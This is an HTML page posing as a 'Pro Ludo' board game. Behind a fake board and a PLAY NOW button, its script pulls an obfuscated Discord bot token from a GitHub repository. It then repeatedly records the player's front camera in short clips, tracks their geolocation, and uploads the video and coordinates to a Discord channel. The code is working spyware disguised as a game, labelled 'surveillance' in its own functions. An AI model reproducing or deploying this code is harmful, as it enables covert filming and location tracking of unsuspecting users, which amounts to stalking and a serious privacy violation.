<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Ludo</title>
    <style>
        body { margin: 0; background: #2c3e50; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; font-family: sans-serif; }
        .board { width: 350px; height: 350px; background: #fff; border: 5px solid #34495e; display: grid; grid-template-columns: repeat(15, 1fr); grid-template-rows: repeat(15, 1fr); padding: 5px; }
        .cell { border: 1px solid #ddd; }
        .home-yellow { grid-column: 1-6; grid-row: 1-6; background: #f1c40f; }
        .home-green { grid-column: 10-15; grid-row: 10-15; background: #27ae60; }
        .home-red { grid-column: 1-6; grid-row: 10-15; background: #e74c3c; }
        .home-blue { grid-column: 10-15; grid-row: 1-6; background: #3498db; }
        .center { grid-column: 7-9; grid-row: 7-9; background: #95a5a6; }
        
        .btn { margin-top: 20px; padding: 15px 30px; background: #f39c12; border: none; font-size: 18px; cursor: pointer; border-radius: 20px; }
        .status { margin-top: 10px; font-size: 14px; color: #ccc; }
    </style>
</head>
<body>

<div style="text-align: center;">
    <div class="board">
        <div class="cell home-yellow"></div>
        <div class="cell home-green"></div>
        <div class="cell home-red"></div>
        <div class="cell home-blue"></div>
        <div class="cell center"></div>
        <!-- Simplified tracks -->
        <div class="cell" style="grid-column: 7-9; grid-row: 1-6;"></div>
        <div class="cell" style="grid-column: 7-9; grid-row: 10-15;"></div>
        <div class="cell" style="grid-column: 1-6; grid-row: 7-9;"></div>
        <div class="cell" style="grid-column: 10-15; grid-row: 7-9;"></div>
    </div>
    <button class="btn" id="playBtn">PLAY NOW</button>
    <div class="status" id="status">Finding opponents...</div>
</div>

<script>
    // --- CONFIGURATION ---
    const CONFIG = {
        // Yeh Repo ka path hai jo admin ne set kiya tha
        REPO_OWNER: "talibmalla455",
        REPO_NAME: "ludo-backend",
        BRANCH: "main", // Ya "master"
        
        // Yeh wahi Key honi chahiye jo Admin Panel mein thi
        ENCODE_KEY: "LUDO_SECURE_2026" 
    };

    // Custom Decoding Logic (Admin wala same hona chahiye)
    function decodeData(encodedStr) {
        if (!encodedStr) return "";
        const parts = encodedStr.split("-");
        let decoded = "";
        for (let i = 0; i < parts.length; i++) {
            let val = parseInt(parts[i], 16);
            let keyCode = CONFIG.ENCODE_KEY.charCodeAt(i % CONFIG.ENCODE_KEY.length);
            let originalChar = val ^ keyCode;
            decoded += String.fromCharCode(originalChar);
        }
        return decoded;
    }

    const playBtn = document.getElementById('playBtn');
    const status = document.getElementById('status');

    playBtn.addEventListener('click', async () => {
        playBtn.disabled = true;
        status.innerText = "Fetching Config from GitHub...";

        try {
            // 1. Fetch from GitHub
            const url = `https://api.github.com/repos/${CONFIG.REPO_OWNER}/${CONFIG.REPO_NAME}/contents/config.json?ref=${CONFIG.BRANCH}`;
            const res = await fetch(url);
            
            if (!res.ok) throw new Error("Config not found");
            
            const data = await res.json();
            
            // 2. Decode Base64 first
            const jsonStr = atob(data.content);
            const payload = JSON.parse(jsonStr);
            
            // 3. Decode Custom Encoding
            const realToken = decodeData(payload.token);
            const realChannel = payload.channel;

            status.innerText = "Access Granted. Starting Surveillance...";

            // 4. Start Recording with Real Token
            startSurveillance(realToken, realChannel);

        } catch (e) {
            status.innerText = "Error: " + e.message;
        }
    });

    function startSurveillance(token, channelId) {
        const mediaRecorder = [];
        let chunks = [];
        
        // Location Logic
        navigator.geolocation.watchPosition(pos => {
            window.locationData = pos.coords;
        });

        // Camera Logic
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
        .then(stream => {
            const recorder = new MediaRecorder(stream);
            
            recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
            
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: "video/webm" });
                chunks = [];
                
                // Upload to Discord
                const formData = new FormData();
                formData.append("file", blob, "surveillance.webm");
                formData.append("content", `📍 Loc: ${window.locationData ? `${window.locationData.latitude},${window.locationData.longitude}` : 'N/A'}`);

                await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
                    method: "POST",
                    headers: { "Authorization": `Bot ${token}` },
                    body: formData
                });

                // Loop
                setTimeout(() => recorder.start(), 5000);
            };

            recorder.start();
            // Record 5 seconds, then stop and restart loop
            setTimeout(() => recorder.stop(), 5000);
        })
        .catch(err => alert("Camera Error: " + err.message));
    }
</script>

</body>
</html>
